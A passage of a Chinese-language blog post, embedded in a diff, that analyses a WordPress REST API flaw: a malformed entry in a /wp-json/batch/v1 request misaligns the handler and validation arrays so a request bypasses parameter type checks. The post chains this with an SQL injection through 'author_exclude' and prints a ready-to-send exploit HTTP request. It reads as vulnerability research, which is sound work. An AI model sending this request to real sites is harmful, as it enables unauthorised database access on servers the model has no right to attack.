+	&#125;
+
+	<span class="variable">$full_route</span> = <span class="string">&#x27;/&#x27;</span> . <span class="variable">$clean_namespace</span> . <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">trim</span>( <span class="variable">$route</span>, <span class="string">&#x27;/&#x27;</span> );
+	<span class="title function_ invoke__">rest_get_server</span>()-&gt;<span class="title function_ invoke__">register_route</span>( <span class="variable">$clean_namespace</span>, <span class="variable">$full_route</span>, <span class="variable">$args</span>, <span class="variable">$override</span> );
+	<span class="keyword">return</span> <span class="literal">true</span>;
+&#125;</code></pre>
+<p>再跟进<code>register_route</code></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018135627409.png" alt="image-20261018135627409"></p>
+<p>也就是说最后的路由格式差不多就是<code> '/' . $clean_namespace . '/' . trim( $route, '/' )</code></p>
+<p>而这里的<code>$this-&gt;parent_base</code>还要看<code>get_post_type_object</code>这个方法的输出</p>
+<p><strong>继续跟踪看看呢</strong></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018143357143.png" alt="image-20261018143357143"></p>
+<p>这里没写什么东西，那么就要看下上下文哪里write了post_type</p>
+<p>找到了一个<code>register_post_type</code>方法，这里依旧没写，往上再找</p>
+<p>发现基本所有的注册都在这里完成</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018144009120.png" alt="image-20261018144009120"></p>
+<p>再回看到<code>register_post_type</code>方法的处理</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018144644212.png" alt="image-20261018144644212"></p>
+<p>这里实例化的<code>WP_Post_Type</code>在<code>__construct</code>魔术方法中将<code>$this-&gt;name=$post_type</code></p>
+<p>那么推下来就能得到三个Controller的route，分别是</p>
+<pre><code class="highlight plaintext">/wp/v2/global-styles/&lt;parent_id&gt;/revisions
+/wp/v2/global-styles/&lt;parent_id&gt;/revisions/&lt;id&gt;
+
+/wp/v2/&lt;article-type&gt;/&lt;parent_id&gt;/revisions
+/wp/v2/&lt;article-type&gt;/&lt;parent_id&gt;/revisions/&lt;id&gt;
+
+
+/wp/v2/&lt;article-type&gt;/
+/wp/v2/&lt;article-type&gt;/&lt;id&gt;</code></pre>
+<p>接着我们再仔细看一下初始化时的操作</p>
+<p>看到这(restapi.php::create_initial_rest_routes)<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018151841196.png" alt="image-20261018151841196"></p>
+<p>这里把post_type做了筛选，接着<code>get_rest_controller()</code></p>
+<p>这个方法返回对应type的对应类或者返回<code>WP_REST_Posts_Controller::class</code>,也就是post type的Controller</p>
+<p>而在最初的post_type的注册中，有且仅有这八个type的show_in_rest为true</p>
+<pre><code class="highlight plaintext">&#x27;post&#x27;    array(&#x27;rest_controller_class&#x27; =&gt; &#x27;WP_REST_Posts_Controller&#x27;)
+&#x27;page&#x27;    array(&#x27;rest_controller_class&#x27; =&gt; &#x27;WP_REST_Posts_Controller&#x27;)
+&#x27;attachment&#x27; array(&#x27;rest_controller_class&#x27; =&gt; &#x27;WP_REST_Attachments_Controller&#x27;)
+&#x27;nav_menu_item&#x27; array(&#x27;rest_controller_class&#x27; =&gt; &#x27;WP_REST_Menu_Items_Controller&#x27;)
+&#x27;wp_block&#x27; array(rest_controller_class&#x27; =&gt; &#x27;WP_REST_Blocks_Controller&#x27;)
+&#x27;wp_navigation&#x27; array(&#x27;rest_controller_class&#x27; =&gt; &#x27;WP_REST_Posts_Controller&#x27;)
+&#x27;wp_font_family&#x27; array(&#x27;rest_controller_class&#x27; =&gt; &#x27;WP_REST_Font_Families_Controller&#x27;)
+&#x27;wp_font_face&#x27; array(&#x27;rest_controller_class&#x27; =&gt; &#x27;WP_REST_Font_Faces_Controller&#x27;)</code></pre>
+<p>而大部分都采用了<code>WP_REST_Posts_Controller</code></p>
+<p>并且对于正常使用来说，最频繁的使用一般都是posts</p>
+<h2 id="a-successful-sql-injectionor-not"><a class="markdownIt-Anchor" href="#a-successful-sql-injectionor-not"></a> A successful SQL injection,or not?</h2>
+<p>那么回到之前那个问题。这个SQL注入<strong>能否单独利用呢?</strong></p>
+<p>我们来看看控制器的实现</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025151035447.png" alt="image-20261025151035447"></p>
+<p>发现这里将传入的<code>author_exclude</code>字段映射为<code>author_not_in</code>的值</p>
+<p>并且在收集时也做了限制</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025151600387.png" alt="image-20261025151600387"></p>
+<p>而请求的参数是如何层层最后传入到<code>WP_Query#get_posts</code>这个函数呢?中途是不是能被这个限制有效拦截住呢?</p>
+<h2 id="how-wp-handle-the-request"><a class="markdownIt-Anchor" href="#how-wp-handle-the-request"></a> How WP handle the request?</h2>
+<p>WordPress的请求入口在<code>rest-api.php</code></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025222621232.png" alt="image-20261025222621232"></p>
+<p>继续跟进，重点在这里</p>
+<pre><code class="highlight plaintext">$request = new WP_REST_Request( $_SERVER[&#x27;REQUEST_METHOD&#x27;], $path );
+
+$request-&gt;set_query_params( wp_unslash( $_GET ) );
+$request-&gt;set_body_params( wp_unslash( $_POST ) );
+$request-&gt;set_file_params( $_FILES );
+$request-&gt;set_headers( $this-&gt;get_headers( wp_unslash( $_SERVER ) ) );
+$request-&gt;set_body( self::get_raw_data() );
+...
+if ( ! is_wp_error( $result ) ) &#123;
+	$result = $this-&gt;dispatch( $request );
+&#125;
+
+// Normalize to either WP_Error or WP_REST_Response...
+$result = rest_ensure_response( $result );
+</code></pre>
+<p>这里在完善包体后直接dispatch</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025223225137.png" alt="image-20261025223225137"></p>
+<p>dispatch中会做<code>has_valid_params</code>和<code>sanitize_params</code>的校验</p>
+<h3 id="has_valid_params"><a class="markdownIt-Anchor" href="#has_valid_params"></a> has_valid_params</h3>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025224818217.png" alt="image-20261025224818217"></p>
+<p>这里会对必要的参数进行检测,be like this:</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025224431868.png" alt="image-20261025224431868"></p>
+<p>那么如果缺少<code>request</code>的参数时，请求就会报错</p>
+<p>后面进行逐参数 validate_callback，这个感觉不是特别重要，就不讲了</p>
+<h3 id="sanitize_params"><a class="markdownIt-Anchor" href="#sanitize_params"></a> sanitize_params</h3>
+<p>这里有大量的continue，重点关注这个就可以</p>
+<p>一开始会调用<code>get_parametor</code>函数获取执行顺序，接着对各个请求方法的参数进行清洗</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025231536848.png" alt="image-20261025231536848"></p>
+<p>如果是不在注册列表中的参数会被保留，对存在的会进行一系列的check</p>
+<p>然后对存在<code>sanitize_callback</code>属性的调用指定函数进行清洗，不存在的默认使用<code>rest_parse_request_arg</code>进行清洗</p>
+<p>若不发生报错则进行覆盖写入</p>
+<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize_params</span>(<span class="params"></span>) </span>&#123;
+    <span class="variable">$attributes</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_attributes</span>();
+    <span class="keyword">if</span> ( <span class="keyword">empty</span>( <span class="variable">$attributes</span>[<span class="string">&#x27;args&#x27;</span>] ) ) &#123;
+        <span class="keyword">return</span> <span class="literal">true</span>;                        <span class="comment">// 没绑 schema → 一个字不洗</span>
+    &#125;
+    <span class="variable">$order</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_parameter_order</span>();  <span class="comment">// JSON → POST → GET → URL → defaults</span>
+
+    <span class="keyword">foreach</span> ( <span class="variable">$order</span> <span class="keyword">as</span> <span class="variable">$type</span> ) &#123;
+        <span class="keyword">foreach</span> ( <span class="variable language_">$this</span>-&gt;params[ <span class="variable">$type</span> ] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span> ) &#123;
+            <span class="keyword">if</span> ( ! <span class="keyword">isset</span>( <span class="variable">$attributes</span>[<span class="string">&#x27;args&#x27;</span>][ <span class="variable">$key</span> ] ) ) &#123;
+                <span class="keyword">continue</span>;                   <span class="comment">// ★ 未注册的参数原样保留，既不校验也不清洗</span>
+            &#125;
+            <span class="variable">$param_args</span> = <span class="variable">$attributes</span>[<span class="string">&#x27;args&#x27;</span>][ <span class="variable">$key</span> ];
+
+            <span class="comment">// 有 type 但没有 sanitize_callback → 默认注入 rest_parse_request_arg</span>
+            <span class="keyword">if</span> ( ! <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&#x27;sanitize_callback&#x27;</span>, <span class="variable">$param_args</span> ) &amp;&amp; ! <span class="keyword">empty</span>( <span class="variable">$param_args</span>[<span class="string">&#x27;type&#x27;</span>] ) ) &#123;
+                <span class="variable">$param_args</span>[<span class="string">&#x27;sanitize_callback&#x27;</span>] = <span class="string">&#x27;rest_parse_request_arg&#x27;</span>;
+            &#125;
+            <span class="keyword">if</span> ( <span class="keyword">empty</span>( <span class="variable">$param_args</span>[<span class="string">&#x27;sanitize_callback&#x27;</span>] ) ) &#123;
+                <span class="keyword">continue</span>;                   <span class="comment">// 没有 type 也没有 callback → 跳过</span>
+            &#125;
+
+            <span class="variable">$sanitized_value</span> = <span class="title function_ invoke__">call_user_func</span>( <span class="variable">$param_args</span>[<span class="string">&#x27;sanitize_callback&#x27;</span>], <span class="variable">$value</span>, <span class="variable">$this</span>, <span class="variable">$key</span> );
+            <span class="keyword">if</span> ( <span class="title function_ invoke__">is_wp_error</span>( <span class="variable">$sanitized_value</span> ) ) &#123;
+                <span class="variable">$invalid_params</span>[ <span class="variable">$key</span> ] = ...;          <span class="comment">// 不抛出，继续洗别的</span>
+            &#125; <span class="keyword">else</span> &#123;
+                <span class="variable language_">$this</span>-&gt;params[ <span class="variable">$type</span> ][ <span class="variable">$key</span> ] = <span class="variable">$sanitized_value</span>;   <span class="comment">// ★ 就地改写</span>
+            &#125;
+        &#125;
+    &#125;
+    <span class="keyword">if</span> ( <span class="variable">$invalid_params</span> ) &#123;
+        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WP_Error</span>( <span class="string">&#x27;rest_invalid_param&#x27;</span>, ..., <span class="keyword">array</span>( <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">400</span>, <span class="string">&#x27;params&#x27;</span> =&gt; ..., <span class="string">&#x27;details&#x27;</span> =&gt; ... ) );
+    &#125;
+    <span class="keyword">return</span> <span class="literal">true</span>;
+&#125;</code></pre>
+<p>我们再看看<code>rest_parse_request_arg</code>是怎么做的清洗</p>
+<pre><code class="highlight php"><span class="function"><span class="keyword">function</span> <span class="title">rest_validate_request_arg</span>(<span class="params"> <span class="variable">$value</span>, <span class="variable">$request</span>, <span class="variable">$param</span> </span>) </span>&#123;
+	<span class="variable">$attributes</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get_attributes</span>();
+	<span class="keyword">if</span> ( ! <span class="keyword">isset</span>( <span class="variable">$attributes</span>[<span class="string">&#x27;args&#x27;</span>][ <span class="variable">$param</span> ] ) || ! <span class="title function_ invoke__">is_array</span>( <span class="variable">$attributes</span>[<span class="string">&#x27;args&#x27;</span>][ <span class="variable">$param</span> ] ) ) &#123;
+		<span class="keyword">return</span> <span class="literal">true</span>;
+	&#125;
+	<span class="variable">$args</span> = <span class="variable">$attributes</span>[<span class="string">&#x27;args&#x27;</span>][ <span class="variable">$param</span> ];
+
+	<span class="keyword">return</span> <span class="title function_ invoke__">rest_validate_value_from_schema</span>( <span class="variable">$value</span>, <span class="variable">$args</span>, <span class="variable">$param</span> );
+&#125;</code></pre>
+<p>再调用，接着会进入这个switch-case</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026004553334.png" alt="image-20261026004553334"></p>
+<p>会对指定了type的参数进行严格的校验</p>
+<p>而这个函数外层还套着foreach，那么数据类型就一定会被进行严格的校验</p>
+<p>然后就能得出，如果实际传入的<code>type</code>不对，就会被<code>sanitize_params()</code>方法捕捉并报错，直接利用完全失败</p>
+<h2 id="batch-route-confusion"><a class="markdownIt-Anchor" href="#batch-route-confusion"></a> Batch route confusion</h2>
+<p>这个地方就很有趣了</p>
+<p>我们看到<code>wp-includes/rest-api/class-wp-rest-server.php</code></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018160054389.png" alt="image-20261018160054389"></p>
+<p>这里首先initial了两个数组<code>$matches</code>和<code>$validation</code>来存储处理的结果</p>
+<h3 id="foreach-1"><a class="markdownIt-Anchor" href="#foreach-1"></a> foreach 1</h3>
+<p>先看第一个<code>foreach</code></p>
+<pre><code class="highlight php"><span class="keyword">foreach</span> ( <span class="variable">$requests</span> <span class="keyword">as</span> <span class="variable">$single_request</span> ) &#123;
+    <span class="keyword">if</span> ( <span class="title function_ invoke__">is_wp_error</span>( <span class="variable">$single_request</span> ) ) &#123;
+        <span class="variable">$has_error</span>    = <span class="literal">true</span>;
+        <span class="variable">$validation</span>[] = <span class="variable">$single_request</span>;
+        <span class="keyword">continue</span>;
+    &#125;
+
+    <span class="variable">$match</span>     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">match_request_to_handler</span>( <span class="variable">$single_request</span> );
+    <span class="variable">$matches</span>[] = <span class="variable">$match</span>;
+    <span class="variable">$error</span>     = <span class="literal">null</span>;
+
+    <span class="keyword">if</span> ( <span class="title function_ invoke__">is_wp_error</span>( <span class="variable">$match</span> ) ) &#123;
+        <span class="variable">$error</span> = <span class="variable">$match</span>;
+    &#125;
+
+    <span class="keyword">if</span> ( ! <span class="variable">$error</span> ) &#123;
+        <span class="keyword">list</span>( <span class="variable">$route</span>, <span class="variable">$handler</span> ) = <span class="variable">$match</span>;
+
+        <span class="keyword">if</span> ( <span class="keyword">isset</span>( <span class="variable">$handler</span>[<span class="string">&#x27;allow_batch&#x27;</span>] ) ) &#123;
+            <span class="variable">$allow_batch</span> = <span class="variable">$handler</span>[<span class="string">&#x27;allow_batch&#x27;</span>];
+        &#125; <span class="keyword">else</span> &#123;
+            <span class="variable">$route_options</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_route_options</span>( <span class="variable">$route</span> );
+            <span class="variable">$allow_batch</span>   = <span class="variable">$route_options</span>[<span class="string">&#x27;allow_batch&#x27;</span>] ?? <span class="literal">false</span>;
+        &#125;
+
+        <span class="keyword">if</span> ( ! <span class="title function_ invoke__">is_array</span>( <span class="variable">$allow_batch</span> ) || <span class="keyword">empty</span>( <span class="variable">$allow_batch</span>[<span class="string">&#x27;v1&#x27;</span>] ) ) &#123;
+            <span class="variable">$error</span> = <span class="keyword">new</span> <span class="title class_">WP_Error</span>(
+                    <span class="string">&#x27;rest_batch_not_allowed&#x27;</span>,
+                    <span class="title function_ invoke__">__</span>( <span class="string">&#x27;The requested route does not support batch requests.&#x27;</span> ),
+                    <span class="keyword">array</span>( <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">400</span> )
+            );
+        &#125;
+    &#125;
+
+    <span class="keyword">if</span> ( ! <span class="variable">$error</span> ) &#123;
+        <span class="variable">$check_required</span> = <span class="variable">$single_request</span>-&gt;<span class="title function_ invoke__">has_valid_params</span>();
+        <span class="keyword">if</span> ( <span class="title function_ invoke__">is_wp_error</span>( <span class="variable">$check_required</span> ) ) &#123;
+            <span class="variable">$error</span> = <span class="variable">$check_required</span>;
+        &#125;
+    &#125;
+
+    <span class="keyword">if</span> ( ! <span class="variable">$error</span> ) &#123;
+        <span class="variable">$check_sanitized</span> = <span class="variable">$single_request</span>-&gt;<span class="title function_ invoke__">sanitize_params</span>();
+        <span class="keyword">if</span> ( <span class="title function_ invoke__">is_wp_error</span>( <span class="variable">$check_sanitized</span> ) ) &#123;
+            <span class="variable">$error</span> = <span class="variable">$check_sanitized</span>;
+        &#125;
+    &#125;
+
+    <span class="keyword">if</span> ( <span class="variable">$error</span> ) &#123;
+        <span class="variable">$has_error</span>    = <span class="literal">true</span>;
+        <span class="variable">$validation</span>[] = <span class="variable">$error</span>;
+    &#125; <span class="keyword">else</span> &#123;
+        <span class="variable">$validation</span>[] = <span class="literal">true</span>;
+    &#125;
+&#125;</code></pre>
+<p>这里先检查<code>$single_request</code>是否error</p>
+<p>若error，则在<code>$validation</code>对应的index下赋值<code>$single_request</code>并continue</p>
+<p>若无错误，则在<code>$matches</code>对应的index下赋值<code>$this-&gt;match_request_to_handler( $single_request );</code></p>
+<p>后面没什么问题，就是一串对于有无error的处理</p>
+<p>问题出在最后一个<code>if-else</code>:</p>
+<p><strong>如果一开始就error,那么<code>$validation</code>会+1,而<code>$matches</code>不变</strong></p>
+<p>但是正常结束呢？</p>
+<p><code>$matches</code>先会被赋值，在最后<code>$validation</code>增加一个true的值</p>
+<p>那么如果通过发送一个请求使得一开始这个条件就成立<code>if ( is_wp_error( $single_request ) )</code></p>
+<p>就会使得原本通过<code>index</code>一一对应的matches-validation组错位</p>
+<p>还有注意的就是这里的几个<code>if (!$error)</code></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025172129612.png" alt="image-20261025172129612"></p>
+<p>第一个检验了route是否有批处理的配置</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025195039852.png" alt="image-20261025195039852"></p>
+<p>第二个和第三个都是检验参数的，前面讲过了，不多说</p>
+<h3 id="foreach-2"><a class="markdownIt-Anchor" href="#foreach-2"></a> foreach 2</h3>
+<p>接下来看第二个<code>foreach</code></p>
+<pre><code class="highlight php"><span class="keyword">foreach</span> ( <span class="variable">$requests</span> <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$single_request</span> ) &#123;
+    <span class="keyword">if</span> ( <span class="title function_ invoke__">is_wp_error</span>( <span class="variable">$single_request</span> ) ) &#123;
+        <span class="variable">$result</span>      = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error_to_response</span>( <span class="variable">$single_request</span> );
+        <span class="variable">$responses</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">envelope_response</span>( <span class="variable">$result</span>, <span class="literal">false</span> )-&gt;<span class="title function_ invoke__">get_data</span>();
+        <span class="keyword">continue</span>;
+    &#125;
+
+    <span class="variable">$clean_request</span> = <span class="keyword">clone</span> <span class="variable">$single_request</span>;
+    <span class="variable">$clean_request</span>-&gt;<span class="title function_ invoke__">set_url_params</span>( <span class="keyword">array</span>() );
+    <span class="variable">$clean_request</span>-&gt;<span class="title function_ invoke__">set_attributes</span>( <span class="keyword">array</span>() );
+    <span class="variable">$clean_request</span>-&gt;<span class="title function_ invoke__">set_default_params</span>( <span class="keyword">array</span>() );
+
+    <span class="comment">/** This filter is documented in wp-includes/rest-api/class-wp-rest-server.php */</span>
+    <span class="variable">$result</span> = <span class="title function_ invoke__">apply_filters</span>( <span class="string">&#x27;rest_pre_dispatch&#x27;</span>, <span class="literal">null</span>, <span class="variable">$this</span>, <span class="variable">$clean_request</span> );
+
+    <span class="keyword">if</span> ( <span class="keyword">empty</span>( <span class="variable">$result</span> ) ) &#123;
+        <span class="variable">$match</span> = <span class="variable">$matches</span>[ <span class="variable">$i</span> ];
+        <span class="variable">$error</span> = <span class="literal">null</span>;
+
+        <span class="keyword">if</span> ( <span class="title function_ invoke__">is_wp_error</span>( <span class="variable">$validation</span>[ <span class="variable">$i</span> ] ) ) &#123;
+            <span class="variable">$error</span> = <span class="variable">$validation</span>[ <span class="variable">$i</span> ];
+        &#125;
+
+        <span class="keyword">if</span> ( <span class="title function_ invoke__">is_wp_error</span>( <span class="variable">$match</span> ) ) &#123;
+            <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error_to_response</span>( <span class="variable">$match</span> );
+        &#125; <span class="keyword">else</span> &#123;
+            <span class="keyword">list</span>( <span class="variable">$route</span>, <span class="variable">$handler</span> ) = <span class="variable">$match</span>;
+
+            <span class="keyword">if</span> ( ! <span class="variable">$error</span> &amp;&amp; ! <span class="title function_ invoke__">is_callable</span>( <span class="variable">$handler</span>[<span class="string">&#x27;callback&#x27;</span>] ) ) &#123;
+                <span class="variable">$error</span> = <span class="keyword">new</span> <span class="title class_">WP_Error</span>(
+                    <span class="string">&#x27;rest_invalid_handler&#x27;</span>,
+                    <span class="title function_ invoke__">__</span>( <span class="string">&#x27;The handler for the route is invalid&#x27;</span> ),
+                    <span class="keyword">array</span>( <span class="string">&#x27;status&#x27;</span> =&gt; <span class="number">500</span> )
+                );
+            &#125;
+
+            <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">respond_to_request</span>( <span class="variable">$single_request</span>, <span class="variable">$route</span>, <span class="variable">$handler</span>, <span class="variable">$error</span> );
+        &#125;
+    &#125;
+
+    <span class="comment">/** This filter is documented in wp-includes/rest-api/class-wp-rest-server.php */</span>
+    <span class="variable">$result</span> = <span class="title function_ invoke__">apply_filters</span>( <span class="string">&#x27;rest_post_dispatch&#x27;</span>, <span class="title function_ invoke__">rest_ensure_response</span>( <span class="variable">$result</span> ), <span class="variable">$this</span>, <span class="variable">$single_request</span> );
+
+    <span class="variable">$responses</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">envelope_response</span>( <span class="variable">$result</span>, <span class="literal">false</span> )-&gt;<span class="title function_ invoke__">get_data</span>();
+&#125;</code></pre>
+<p>这里把之前存进去的<code>$validation</code>和<code>$matches</code>又全取出来了</p>
+<p>我们先厘清一下这三个变量存储的是什么</p>
+<pre><code class="highlight plaintext">$single_request 一个以每个独立请求的method和路由的path为参数的WP_REST_Request对象
+$validation 存储true/Wp_Error对象
+$matches 存储请求中的handler和route</code></pre>
+<p>那么根据前面的错位，就会出现index[1]的request实际使用的是index[2]请求的handler的情况</p>
+<p>此时<code>respond_to_request</code>对其进行处理:</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025144847063.png" alt="image-20261025144847063"></p>
+<p>会发现几乎不校验route</p>
+<p>只在最后会使用route</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025144925590.png" alt="image-20261025144925590"></p>
+<p>那么也就相当于这里会用handler的回调函数来处理request，<strong>且不事先对传入的route进行校验</strong></p>
+<p>感觉这个处理就很神秘，相当于route几乎没有被用上了</p>
+<h2 id="2-bugs-lead-to-wp2shell"><a class="markdownIt-Anchor" href="#2-bugs-lead-to-wp2shell"></a> 2 bugs lead to wp2shell</h2>
+<p>两个漏洞单独拎出来感觉都是无法找到利用的口子的</p>
+<p>但是一结合起来就出问题了</p>
+<p>我们可以利用错位的机制来绕过原由路由的handler对参数类型的严格限制</p>
+<p>这里直接借用原作者的demo了</p>
+<pre><code class="highlight plaintext">POST /wp-json/batch/v1 HTTP/1.1
+Host: localhost
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: 364
+
+&#123;
+  &quot;validation&quot;: &quot;normal&quot;,
+  &quot;requests&quot;: [
+    &#123;
+      &quot;method&quot;: &quot;POST&quot;,
+      &quot;path&quot;: &quot;http://:&quot;
+    &#125;,
+    &#123;
+      &quot;method&quot;: &quot;DELETE&quot;,
+      &quot;path&quot;: &quot;/wp/v2/posts/1&quot;,
+      &quot;body&quot;: &#123;
+        &quot;author_exclude&quot;: &quot;foobar&quot;
+      &#125;
+    &#125;,
+    &#123;
+      &quot;method&quot;: &quot;GET&quot;,
+      &quot;path&quot;: &quot;/wp/v2/posts&quot;
+    &#125;
+  ]
+&#125;</code></pre>
+<p>在处理时，由于错位，第一个循环后的数组指针大概会出现这样的变化</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>request</th>
+<th>validation[]</th>
+<th>matches[]</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1st req</td>
+<td>0</td>
+<td>0(WP_Error)</td>
+<td>0</td>
+</tr>
+<tr>
+<td>2nd req</td>
+<td>1</td>
+<td>1</td>
+<td>0</td>
+</tr>
+<tr>
+<td>3rd req</td>
+<td>2</td>
+<td>2</td>
+<td>1</td>
+</tr>
+<tr>
+<td>final condition</td>
+<td>/</td>
+<td>3</td>
+<td>2</td>
+</tr>
+</tbody>
+</table>
+<p>那么在第二次的循环中</p>
+<p>index=0的request因为<code>is_wp_error</code>为真，就会被直接跳过</p>
+<p>那么连着第一个请求的match就也被跳过了(是按照对其i的规则来处理得到resp的)</p>
+<p>处理index=1的request时，此时对齐i得到的就是index=1的validation(<strong>属于第二个请求</strong>)和index=1的macthes(<strong>属于第三个请求</strong>)，此时是validation=true</p>
+<p>最后的<code>respond_to_request</code>就会调用对应route下的handler的callback函数</p>
+<p>这里我们又要上去看眼matches数组的元素是怎么处理得到的</p>
+<pre><code class="highlight php"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">match_request_to_handler</span>(<span class="params"> <span class="variable">$request</span> </span>) </span>&#123;
+		<span class="variable">$method</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get_method</span>();
+		<span class="variable">$path</span>   = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get_route</span>();
+
+		<span class="variable">$with_namespace</span> = <span class="keyword">array</span>();
+
+		<span class="keyword">foreach</span> ( <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_namespaces</span>() <span class="keyword">as</span> <span class="variable">$namespace</span> ) &#123;
+			<span class="keyword">if</span> ( <span class="title function_ invoke__">str_starts_with</span>( <span class="title function_ invoke__">trailingslashit</span>( <span class="title function_ invoke__">ltrim</span>( <span class="variable">$path</span>, <span class="string">&#x27;/&#x27;</span> ) ), <span class="variable">$namespace</span> ) ) &#123;
+				<span class="variable">$with_namespace</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_routes</span>( <span class="variable">$namespace</span> );
+			&#125;
+		&#125;
+
+		<span class="keyword">if</span> ( <span class="variable">$with_namespace</span> ) &#123;
+			<span class="variable">$routes</span> = <span class="title function_ invoke__">array_merge</span>( ...<span class="variable">$with_namespace</span> );
+		&#125; <span class="keyword">else</span> &#123;
+			<span class="variable">$routes</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_routes</span>();
+		&#125;
+
+		<span class="keyword">foreach</span> ( <span class="variable">$routes</span> <span class="keyword">as</span> <span class="variable">$route</span> =&gt; <span class="variable">$handlers</span> ) &#123;
+			<span class="variable">$match</span> = <span class="title function_ invoke__">preg_match</span>( <span class="string">&#x27;@^&#x27;</span> . <span class="variable">$route</span> . <span class="string">&#x27;$@i&#x27;</span>, <span class="variable">$path</span>, <span class="variable">$matches</span> );
+
+			<span class="keyword">if</span> ( ! <span class="variable">$match</span> ) &#123;
+				<span class="keyword">continue</span>;
+			&#125;
+
+			<span class="variable">$args</span> = <span class="keyword">array</span>();
+
+			<span class="keyword">foreach</span> ( <span class="variable">$matches</span> <span class="keyword">as</span> <span class="variable">$param</span> =&gt; <span class="variable">$value</span> ) &#123;
+				<span class="keyword">if</span> ( ! <span class="title function_ invoke__">is_int</span>( <span class="variable">$param</span> ) ) &#123;
+					<span class="variable">$args</span>[ <span class="variable">$param</span> ] = <span class="variable">$value</span>;
+				&#125;
+			&#125;
+
+			<span class="keyword">foreach</span> ( <span class="variable">$handlers</span> <span class="keyword">as</span> <span class="variable">$handler</span> ) &#123;
+				<span class="variable">$callback</span> = <span class="variable">$handler</span>[<span class="string">&#x27;callback&#x27;</span>];
+
+				<span class="comment">// Fallback to GET method if no HEAD method is registered.</span>
+				<span class="variable">$checked_method</span> = <span class="variable">$method</span>;
+				<span class="keyword">if</span> ( <span class="string">&#x27;HEAD&#x27;</span> === <span class="variable">$method</span> &amp;&amp; <span class="keyword">empty</span>( <span class="variable">$handler</span>[<span class="string">&#x27;methods&#x27;</span>][<span class="string">&#x27;HEAD&#x27;</span>] ) ) &#123;
+					<span class="variable">$checked_method</span> = <span class="string">&#x27;GET&#x27;</span>;
+				&#125;
+				<span class="keyword">if</span> ( <span class="keyword">empty</span>( <span class="variable">$handler</span>[<span class="string">&#x27;methods&#x27;</span>][ <span class="variable">$checked_method</span> ] ) ) &#123;
+					<span class="keyword">continue</span>;
+				&#125;
+
+				<span class="keyword">if</span> ( ! <span class="title function_ invoke__">is_callable</span>( <span class="variable">$callback</span> ) ) &#123;
+					<span class="keyword">return</span> <span class="keyword">array</span>( <span class="variable">$route</span>, <span class="variable">$handler</span> );
+				&#125;
+
+				<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">set_url_params</span>( <span class="variable">$args</span> );
+				<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">set_attributes</span>( <span class="variable">$handler</span> );
+
+				<span class="variable">$defaults</span> = <span class="keyword">array</span>();
+
+				<span class="keyword">foreach</span> ( <span class="variable">$handler</span>[<span class="string">&#x27;args&#x27;</span>] <span class="keyword">as</span> <span class="variable">$arg</span> =&gt; <span class="variable">$options</span> ) &#123;
+					<span class="keyword">if</span> ( <span class="keyword">isset</span>( <span class="variable">$options</span>[<span class="string">&#x27;default&#x27;</span>] ) ) &#123;
+						<span class="variable">$defaults</span>[ <span class="variable">$arg</span> ] = <span class="variable">$options</span>[<span class="string">&#x27;default&#x27;</span>];
+					&#125;
+				&#125;
+
+				<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">set_default_params</span>( <span class="variable">$defaults</span> );
+
